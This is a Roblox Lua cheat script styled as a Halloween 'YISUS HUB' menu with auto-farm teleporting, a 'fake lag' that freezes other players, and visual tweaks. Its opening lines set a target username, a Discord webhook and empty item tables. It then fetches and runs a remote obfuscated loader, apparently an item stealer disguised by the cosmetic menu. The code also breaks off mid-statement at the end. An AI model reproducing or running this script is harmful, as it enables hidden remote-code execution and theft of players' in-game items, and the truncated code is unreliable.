-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "josue_malo_3030"
getgenv().WEBHOOK_URL = "https://discord.gg/nzJxUdqSS"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

task.spawn(function()
    -- 🎃 YISUS HUB
    -- 🎃 HALLOWEEN UI EDITION
    -- FAKE LAG + AUTO FARM + VISIÓN + MANTENIMIENTO
    -- 🎃 YISUS VS NOXIL 🎃
    -- UN SOLO LOCALSCRIPT
    
    local Players = game:GetService("Players")
    local UIS = game:GetService("UserInputService")
    local Lighting = game:GetService("Lighting")
    
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    local old = playerGui:FindFirstChild("GalaxyHalloweenSystem")
    if old then
    	old:Destroy()
    end
    
    --------------------------------------------------
    -- GUI PRINCIPAL
    --------------------------------------------------
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "GalaxyHalloweenSystem"
    gui.ResetOnSpawn = false
    gui.Parent = playerGui
    
    local main = Instance.new("Frame")
    main.Size = UDim2.fromOffset(235,145)
    main.Position = UDim2.new(1,-250,.5,-72)
    main.BackgroundColor3 = Color3.fromRGB(10,7,16)
    main.BorderSizePixel = 0
    main.Active = true
    main.Parent = gui
    
    Instance.new("UICorner",main).CornerRadius = UDim.new(0,20)
    
    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(255,105,20)
    mainStroke.Thickness = 2
    mainStroke.Parent = main
    
    local mainGradient = Instance.new("UIGradient")
    mainGradient.Color = ColorSequence.new{
    	ColorSequenceKeypoint.new(0,Color3.fromRGB(25,10,30)),
    	ColorSequenceKeypoint.new(.5,Color3.fromRGB(12,7,18)),
    	ColorSequenceKeypoint.new(1,Color3.fromRGB(35,10,15))
    }
    mainGradient.Rotation = 45
    mainGradient.Parent = main
    
    --------------------------------------------------
    -- ENCABEZADO
    --------------------------------------------------
    
    local topLine = Instance.new("Frame")
    topLine.Size = UDim2.new(1,-20,0,2)
    topLine.Position = UDim2.fromOffset(10,35)
    topLine.BackgroundColor3 = Color3.fromRGB(255,90,15)
    topLine.BorderSizePixel = 0
    topLine.Parent = main
    
    local mainTitle = Instance.new("TextLabel")
    mainTitle.Size = UDim2.new(1,-20,0,30)
    mainTitle.Position = UDim2.fromOffset(10,5)
    mainTitle.BackgroundTransparency = 1
    mainTitle.Text = "🎃  YISUS HUB  🎃"
    mainTitle.TextColor3 = Color3.fromRGB(255,145,35)
    mainTitle.TextSize = 15
    mainTitle.Font = Enum.Font.GothamBlack
    mainTitle.Parent = main
    
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1,-20,0,16)
    subtitle.Position = UDim2.fromOffset(10,37)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "🕸️  NOCHE DE TERROR  •  2026  🕸️"
    subtitle.TextColor3 = Color3.fromRGB(180,90,180)
    subtitle.TextSize = 8
    subtitle.Font = Enum.Font.GothamBold
    subtitle.Parent = main
    
    --------------------------------------------------
    -- BOTÓN ABRIR
    --------------------------------------------------
    
    local fakeOpen = Instance.new("TextButton")
    fakeOpen.Size = UDim2.new(1,-24,0,36)
    fakeOpen.Position = UDim2.fromOffset(12,57)
    fakeOpen.BackgroundColor3 = Color3.fromRGB(27,18,30)
    fakeOpen.BorderSizePixel = 0
    fakeOpen.Text = "⚡  ABRIR MENÚ"
    fakeOpen.TextColor3 = Color3.fromRGB(255,175,75)
    fakeOpen.TextSize = 11
    fakeOpen.Font = Enum.Font.GothamBold
    fakeOpen.Parent = main
    
    Instance.new("UICorner",fakeOpen).CornerRadius = UDim.new(0,11)
    
    local fakeOpenStroke = Instance.new("UIStroke")
    fakeOpenStroke.Color = Color3.fromRGB(255,90,15)
    fakeOpenStroke.Thickness = 1.5
    fakeOpenStroke.Parent = fakeOpen
    
    --------------------------------------------------
    -- MENSAJES
    --------------------------------------------------
    
    local thanks = Instance.new("TextLabel")
    thanks.Size = UDim2.new(1,-20,0,16)
    thanks.Position = UDim2.fromOffset(10,97)
    thanks.BackgroundTransparency = 1
    thanks.Text = "👻 Gracias por usar mi script 👻"
    thanks.TextColor3 = Color3.fromRGB(255,155,60)
    thanks.TextSize = 9
    thanks.Font = Enum.Font.GothamBold
    thanks.Parent = main
    
    local welcome = Instance.new("TextLabel")
    welcome.Size = UDim2.new(1,-20,0,25)
    welcome.Position = UDim2.fromOffset(10,115)
    welcome.BackgroundTransparency = 1
    welcome.Text = "🌙 Bienvenido a la noche de Halloween 🌙"
    welcome.TextColor3 = Color3.fromRGB(195,140,100)
    welcome.TextSize = 8
    welcome.Font = Enum.Font.Gotham
    welcome.Parent = main
    
    --------------------------------------------------
    -- MINIMIZAR PRIMER MENÚ
    --------------------------------------------------
    
    local mainMinimized = false
    
    local mainMinimize = Instance.new("TextButton")
    mainMinimize.Size = UDim2.fromOffset(28,26)
    mainMinimize.Position = UDim2.new(1,-36,0,8)
    mainMinimize.BackgroundColor3 = Color3.fromRGB(40,20,15)
    mainMinimize.BorderSizePixel = 0
    mainMinimize.Text = "—"
    mainMinimize.TextColor3 = Color3.fromRGB(255,170,70)
    mainMinimize.TextSize = 16
    mainMinimize.Font = Enum.Font.GothamBlack
    mainMinimize.Parent = main
    
    Instance.new("UICorner",mainMinimize).CornerRadius = UDim.new(0,8)
    
    --------------------------------------------------
    -- SEGUNDO MENÚ
    --------------------------------------------------
    
    local window = Instance.new("Frame")
    window.Name = "HalloweenFunctions"
    window.Size = UDim2.fromOffset(235,285)
    window.Position = UDim2.new(.5,-117,.5,-142)
    window.BackgroundColor3 = Color3.fromRGB(9,6,14)
    window.BorderSizePixel = 0
    window.Active = true
    window.Visible = false
    window.Parent = gui
    
    Instance.new("UICorner",window).CornerRadius = UDim.new(0,20)
    
    local winGradient = Instance.new("UIGradient")
    winGradient.Color = ColorSequence.new{
    	ColorSequenceKeypoint.new(0,Color3.fromRGB(30,10,30)),
    	ColorSequenceKeypoint.new(.45,Color3.fromRGB(11,7,16)),
    	ColorSequenceKeypoint.new(1,Color3.fromRGB(35,9,12))
    }
    winGradient.Rotation = 45
    winGradient.Parent = window
    
    local winStroke = Instance.new("UIStroke")
    winStroke.Color = Color3.fromRGB(255,90,10)
    winStroke.Thickness = 2.5
    winStroke.Parent = window
    
    local shadow = Instance.new("UIStroke")
    shadow.Color = Color3.fromRGB(110,20,5)
    shadow.Thickness = 8
    shadow.Transparency = .6
    shadow.Parent = window
    
    --------------------------------------------------
    -- DECORACIÓN
    --------------------------------------------------
    
    local spiderTop = Instance.new("TextLabel")
    spiderTop.Size = UDim2.fromOffset(35,30)
    spiderTop.Position = UDim2.fromOffset(7,4)
    spiderTop.BackgroundTransparency = 1
    spiderTop.Text = "🕷️"
    spiderTop.TextSize = 18
    spiderTop.Parent = window
    
    local moon = Instance.new("TextLabel")
    moon.Size = UDim2.fromOffset(35,30)
    moon.Position = UDim2.new(1,-42,0,4)
    moon.BackgroundTransparency = 1
    moon.Text = "🌙"
    moon.TextSize = 18
    moon.Parent = window
    
    --------------------------------------------------
    -- TÍTULO
    --------------------------------------------------
    
    local titleBack = Instance.new("TextLabel")
    titleBack.Size = UDim2.new(1,0,0,42)
    titleBack.BackgroundTransparency = 1
    titleBack.Text = "🎃  YISUS HUB  🎃"
    titleBack.TextColor3 = Color3.fromRGB(70,15,5)
    titleBack.TextSize = 20
    titleBack.Font = Enum.Font.GothamBlack
    titleBack.Position = UDim2.fromOffset(2,5)
    titleBack.Parent = window
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,42)
    title.BackgroundTransparency = 1
    title.Text = "🎃  YISUS HUB  🎃"
    title.TextColor3 = Color3.fromRGB(255,130,20)
    title.TextStrokeColor3 = Color3.fromRGB(80,10,0)
    title.TextStrokeTransparency = 0
    title.TextSize = 20
    title.Font = Enum.Font.GothamBlack
    title.Parent = window
    
    local titleLine = Instance.new("Frame")
    titleLine.Size = UDim2.new(1,-30,0,2)
    titleLine.Position = UDim2.fromOffset(15,43)
    titleLine.BackgroundColor3 = Color3.fromRGB(255,90,15)
    titleLine.BorderSizePixel = 0
    titleLine.Parent = window
    
    --------------------------------------------------
    -- FAKE LAG
    --------------------------------------------------
    
    local fakeButton = Instance.new("TextButton")
    fakeButton.Size = UDim2.new(1,-24,0,38)
    fakeButton.Position = UDim2.fromOffset(12,52)
    fakeButton.BackgroundColor3 = Color3.fromRGB(28,20,28)
    fakeButton.BorderSizePixel = 0
    fakeButton.Text = "⚡  FAKE LAG: OFF"
    fakeButton.TextColor3 = Color3.fromRGB(255,255,255)
    fakeButton.TextSize = 11
    fakeButton.Font = Enum.Font.GothamBold
    fakeButton.Parent = window
    
    Instance.new("UICorner",fakeButton).CornerRadius = UDim.new(0,12)
    
    local fakeButtonStroke = Instance.new("UIStroke")
    fakeButtonStroke.Color = Color3.fromRGB(255,90,15)
    fakeButtonStroke.Thickness = 2
    fakeButtonStroke.Parent = fakeButton
    
    local fakeStatus = Instance.new("TextLabel")
    fakeStatus.Size = UDim2.new(1,-24,0,10)
    fakeStatus.Position = UDim2.fromOffset(12,91)
    fakeStatus.BackgroundTransparency = 1
    fakeStatus.Text = ""
    fakeStatus.TextSize = 8
    fakeStatus.Font = Enum.Font.GothamBold
    fakeStatus.Parent = window
    
    --------------------------------------------------
    -- AUTO FARM
    --------------------------------------------------
    
    local farmButton = Instance.new("TextButton")
    farmButton.Size = UDim2.new(1,-24,0,38)
    farmButton.Position = UDim2.fromOffset(12,103)
    farmButton.BackgroundColor3 = Color3.fromRGB(27,20,23)
    farmButton.BorderSizePixel = 0
    farmButton.Text = "🎃  AUTO FARM: OFF"
    farmButton.TextColor3 = Color3.fromRGB(255,170,70)
    farmButton.TextSize = 11
    farmButton.Font = Enum.Font.GothamBold
    farmButton.Parent = window
    
    Instance.new("UICorner",farmButton).CornerRadius = UDim.new(0,11)
    
    local farmStroke = Instance.new("UIStroke")
    farmStroke.Color = Color3.fromRGB(255,105,20)
    farmStroke.Thickness = 1.5
    farmStroke.Parent = farmButton
    
    local farmActive = false
    local farmThread = nil
    
    local function getRoot()
    	local char = player.Character
    	return char and char:FindFirstChild("HumanoidRootPart")
    end
    
    local function isFarmObject(obj)
    	local n = string.lower(obj.Name)
    	return n:find("pumpkin")
    		or n:find("halloween")
    		or n:find("candy")
    		or n:find("calabaza")
    end
    
    local function findFarmObjects()
    	local objects = {}
    	for _,obj in ipairs(workspace:GetDescendants()) do
    		if obj:IsA("BasePart") and isFarmObject(obj) then
    			table.insert(objects,obj)
    		end
    	end
    	return objects
    end
    
    local function stopFarm()
    	farmActive = false
    	farmThread = nil
    	farmButton.Text = "🎃  AUTO FARM: OFF"
    	farmButton.TextColor3 = Color3.fromRGB(255,170,70)
    end
    
    farmButton.MouseButton1Click:Connect(function()
    	if farmActive then
    		stopFarm()
    		return
    	end
    	farmActive = true
    	farmButton.Text = "🎃  AUTO FARM: ON"
    	farmButton.TextColor3 = Color3.fromRGB(100,255,120)
    
    	farmThread = task.spawn(function()
    		local emptyScans = 0
    		while farmActive do
    			local root = getRoot()
    			if not root then
    				break
    			end
    			local objects = findFarmObjects()
    			if #objects == 0 then
    				emptyScans += 1
    				if emptyScans >= 3 then
    					break
    				end
    				task.wait()
    				continue
    			end
    			emptyScans = 0
    			for _,obj in ipairs(objects) do
    				if not farmActive then
    					break
    				end
    				if obj and obj.Parent then
    					root = getRoot()
    					if not root then
    						break
    					end
    					root.CFrame = obj.CFrame + Vector3.new(0,3,0)
    					task.wait()
    				end
    			end
    		end
    		if farmActive then
    			stopFarm()
    		end
    	end)
    end)
    
    --------------------------------------------------
    -- VISIÓN
    --------------------------------------------------
    
    local visionButton = Instance.new("TextButton")
    visionButton.Size = UDim2.new(1,-24,0,38)
    visionButton.Position = UDim2.fromOffset(12,145)
    visionButton.BackgroundColor3 = Color3.fromRGB(20,22,30)
    visionButton.BorderSizePixel = 0
    visionButton.Text = "👁️  VISIÓN: OFF"
    visionButton.TextColor3 = Color3.fromRGB(180,190,200)
    visionButton.TextSize = 11
    visionButton.Font = Enum.Font.GothamBold
    visionButton.Parent = window
    
    Instance.new("UICorner",visionButton).CornerRadius = UDim.new(0,11)
    
    local visionStroke = Instance.new("UIStroke")
    visionStroke.Color = Color3.fromRGB(140,70,30)
    visionStroke.Thickness = 1.5
    visionStroke.Parent = visionButton
    
    local visionActive = false
    local originals = {}
    
    local function excluded(obj)
    	local p = obj
    	while p do
    		local n = string.lower(p.Name)
    		if n == "galaxyneonfixsystem"
    			or n == "galaxy neon"
    			or n == "galaxyneon" then
    			return true
    		end
    		p = p.Parent
    	end
    	return false
    end
    
    local function save(part)
    	if originals[part] then
    		return
    	end
    	originals[part] = {
    		Color = part.Color,
    		Material = part.Material,
    		Reflectance = part.Reflectance,
    		Transparency = part.Transparency
    	}
    end
    
    local function isWoodPart(part,n)
    	return part.Material == Enum.Material.Wood
    		or part.Material == Enum.Material.WoodPlanks
    		or n:find("wood")
    		or n:find("madera")
    		or n:find("plank")
    		or n:find("tabla")
    end
    
    local function isGlassPart(part,n)
    	if isWoodPart(part,n) then
    		return false
    	end
    	return part.Material == Enum.Material.Glass
    		or n:find("glass")
    		or n:find("vidrio")
    end
    
    local function applyVision(part)
    	if not part:IsA("BasePart") then
    		return
    	end
    	if excluded(part) then
    		return
    	end
    	local n = string.lower(part.Name)
    	if isWoodPart(part,n) then
    		save(part)
    		part.Color = Color3.fromRGB(105,48,16)
    		part.Reflectance = .025
    	elseif isGlassPart(part,n) then
    		save(part)
    		part.Transparency = .82
    		part.Reflectance = .04
    	elseif part.Material == Enum.Material.Brick
    		or n:find("brick")
    		or n:find("ladrillo") then
    		save(part)
    		part.Color = Color3.fromRGB(145,70,42)
    		part.Reflectance = 0
    	elseif n:find("metal")
    		or n:find("iron")
    		or n:find("steel")
    		or n:find("acero") then
    		save(part)
    		part.Reflectance = .14
    	end
    end
    
    --------------------------------------------------
    -- EFECTOS DE VISIÓN
    --------------------------------------------------
    
    local function createVisionEffects()
    	if not Lighting:FindFirstChild("GalaxyRealismColor") then
    		local cc = Instance.new("ColorCorrectionEffect")
    		cc.Name = "GalaxyRealismColor"
    		cc.Brightness = .005
    		cc.Contrast = .22
    		cc.Saturation = .30
    		cc.Parent = Lighting
    	end
    	if not Lighting:FindFirstChild("GalaxyRealismBloom") then
    		local bloom = Instance.new("BloomEffect")
    		bloom.Name = "GalaxyRealismBloom"
    		bloom.Intensity = .045
    		bloom.Size = 16
    		bloom.Threshold = 1.65
    		bloom.Parent = Lighting
    	end
    end
    
    local function refreshVision()
    	if not visionActive then
    		return
    	end
    	createVisionEffects()
    	for _,obj in ipairs(workspace:GetDescendants()) do
    		if not visionActive then
    			break
    		end
    		applyVision(obj)
    	end
    end
    
    local function enableVision()
    	visionActive = true
    	createVisionEffects()
    	refreshVision()
    	visionButton.Text = "👁️  VISIÓN: ON"
    	visionButton.TextColor3 = Color3.fromRGB(100,255,150)
    end
    
    local function disableVision()
    	visionActive = false
    	for part,data in pairs(originals) do
    		if part and part.Parent then
    			part.Color = data.Color
    			part.Material = data.Material
    			part.Reflectance = data.Reflectance
    			part.Transparency = data.Transparency
    		end
    	end
    	table.clear(originals)
    	local cc = Lighting:FindFirstChild("GalaxyRealismColor")
    	if cc then cc:Destroy() end
    	local bloom = Lighting:FindFirstChild("GalaxyRealismBloom")
    	if bloom then bloom:Destroy() end
    	visionButton.Text = "👁️  VISIÓN: OFF"
    	visionButton.TextColor3 = Color3.fromRGB(180,190,200)
    end
    
    visionButton.MouseButton1Click:Connect(function()
    	if visionActive then
    		disableVision()
    	else
    		enableVision()
    	end
    end)
    
    workspace.DescendantAdded:Connect(function(obj)
    	if not visionActive then
    		return
    	end
    	task.defer(function()
    		if visionActive and obj:IsA("BasePart") then
    			applyVision(obj)
    		end
    	end)
    end)
    
    --------------------------------------------------
    -- OPCIÓN EN MANTENIMIENTO
    --------------------------------------------------
    
    local maintenanceButton = Instance.new("TextButton")
    maintenanceButton.Size = UDim2.new(1,-24,0,38)
    maintenanceButton.Position = UDim2.fromOffset(12,187)
    maintenanceButton.BackgroundColor3 = Color3.fromRGB(24,20,28)
    maintenanceButton.BorderSizePixel = 0
    maintenanceButton.Text = "🔧  OPCIÓN EN MANTENIMIENTO"
    maintenanceButton.TextColor3 = Color3.fromRGB(150,145,155)
    maintenanceButton.TextSize = 10
    maintenanceButton.Font = Enum.Font.GothamBold
    maintenanceButton.AutoButtonColor = false
    maintenanceButton.Parent = window
    
    Instance.new("UICorner",maintenanceButton).CornerRadius = UDim.new(0,11)
    
    local maintenanceStroke = Instance.new("UIStroke")
    maintenanceStroke.Color = Color3.fromRGB(90,80,95)
    maintenanceStroke.Thickness = 1.5
    maintenanceStroke.Transparency = .25
    maintenanceStroke.Parent = maintenanceButton
    
    maintenanceButton.MouseButton1Click:Connect(function()
    	maintenanceButton.Text = "🔧  PRÓXIMAMENTE"
    	maintenanceButton.TextColor3 = Color3.fromRGB(255,170,70)
    	task.delay(2,function()
    		if maintenanceButton and maintenanceButton.Parent then
    			maintenanceButton.Text = "🔧  OPCIÓN EN MANTENIMIENTO"
    			maintenanceButton.TextColor3 = Color3.fromRGB(150,145,155)
    		end
    	end)
    end)
    
    --------------------------------------------------
    -- FIRMA
    --------------------------------------------------
    
    local creatorText = Instance.new("TextLabel")
    creatorText.Size = UDim2.new(1,-24,0,22)
    creatorText.Position = UDim2.fromOffset(12,233)
    creatorText.BackgroundTransparency = 1
    creatorText.Text = "🎃  YISUS  VS  NOXIL  🎃"
    creatorText.TextColor3 = Color3.fromRGB(255,140,35)
    creatorText.TextSize = 10
    creatorText.Font = Enum.Font.GothamBlack
    creatorText.TextStrokeColor3 = Color3.fromRGB(80,10,0)
    creatorText.TextStrokeTransparency = .35
    creatorText.Parent = window
    
    --------------------------------------------------
    -- FAKE LAG
    --------------------------------------------------
    
    local lagActive = false
    
    fakeButton.MouseButton1Click:Connect(function()
    	lagActive = not lagActive
    	if lagActive then
    		fakeButton.Text = "⚡  FAKE LAG: ACTIVE"
    		fakeButton.BackgroundColor3 = Color3.fromRGB(0,150,0)
    		fakeStatus.Text = "👻 Enemigo congelado"
    		fakeStatus.TextColor3 = Color3.fromRGB(0,255,0)
    
    		task.spawn(function()
    			while lagActive do
    				for _,otherPlayer in pairs(Players:GetPlayers()) do
    					if otherPlayer ~= player and otherPlayer.Character then
    						for _,part in pairs(otherPlayer.Character:GetDescendants()) do
    							if part:IsA("BasePart") then
    								part.Anchored = true
    							end
    						end
    					end
    				end
    				task.wait(.5)
    				for _,otherPlayer in pairs(Players:GetPlayers()) do
    					if otherPlayer.Character then
    						for _,part in pairs(otherPlayer.Character:GetDescendants()) do
    							if part:IsA("BasePart") then
    								part.Anchored = false
    							end
    						end
    					end
    				end
    				task.wait(.1)
    			end
    		end)
    	else
    		fakeButton.Text = "⚡  FAKE LAG: OFF"
    		fakeButton.BackgroundColor3 = Color3.fromRGB(28,20,28)
    		fakeStatus.Text = ""
    		for _,otherPlayer in pairs(Players:GetPlayers()) do
    			if otherPlayer.Character then
    				for _,part in pairs(otherPlayer.Character:GetDescendants()) do
    					if part:IsA("BasePart") then
    						part.Anchored = false
    					end
    				end
    			end
    		end
    	end
    end)
    
    --------------------------------------------------
    -- ABRIR / CERRAR MENÚ
    --------------------------------------------------
    
    fakeOpen.MouseButton1Click:Connect(function()
    	window.Visible = not window.Visible
    end)
    
    --------------------------------------------------
    -- MINIMIZAR SEGUNDO MENÚ
    --------------------------------------------------
    
    local minimized = false
    
    local minimize = Instance.new("TextButton")
    minimize.Size = UDim2.fromOffset(29,26)
    minimize.Position = UDim2.new(1,-36,0,8)
    minimize.BackgroundColor3 = Color3.fromRGB(40,20,15)
    minimize.BorderSizePixel = 0
    minimize.Text = "—"
    minimize.TextColor3 = Color3.fromRGB(255,170,70)
    minimize.TextSize = 16
    minimize.Font = Enum.Font.GothamBlack
    minimize.Parent = window
    
    Instance.new("UICorner",minimize).CornerRadius = UDim.new(0,8)
    
    minimize.MouseButton1Click:Connect(function()
    	minimized = not minimized
    	if minimized then
    		window.Size = UDim2.fromOffset(235,58)
    		fakeButton.Visible = false
    		fakeStatus.Visible = false
    		farmButton.Visible = false
    		visionButton.Visible = false
    		maintenanceButton.Visible = false
    		creatorText.Visible = false
    		minimize.Text = "+"
    	else
    		window.Size = UDim2.fromOffset(235,285)
    		fakeButton.Visible = true
    		fakeStatus.Visible = true
    		farmButton.Visible = true
    		visionButton.Visible = true
    		maintenanceButton.Visible = true
    		creatorText.Visible = true
    		minimize.Text = "—"
    	end
    end)
    
    --------------------------------------------------
    -- MINIMIZAR PRIMER MENÚ
    --------------------------------------------------
    
    mainMinimize.MouseButton1Click:Connect(function()
    	mainMinimized = not mainMinimized
    	if mainMinimized then
    		main.Size = UDim2.fromOffset(235,55)
    		topLine.Visible = false
    		subtitle.Visible = false
    		fakeOpen.Visible = false
    		thanks.Visible = false
    		welcome.Visible
end)